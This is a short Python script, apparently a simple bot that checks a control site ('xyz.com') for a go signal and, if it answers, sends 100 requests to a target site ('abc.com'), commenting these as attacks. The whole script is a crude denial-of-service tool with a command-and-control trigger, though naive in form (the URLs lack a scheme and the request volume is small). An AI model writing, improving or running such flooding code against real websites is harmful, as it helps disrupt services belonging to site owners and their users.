import requests
check = requests.get('xyz.com') # Checks whether attack command is give or not
determine = check.status_code # If website is live, proceeds further
if determine == 200:
    for i in range(100):
        requests.get('abc.com') # Attacks the target website
        print('attack successful')
else:
    print(f'attack unsuccessful exit code {determine}')
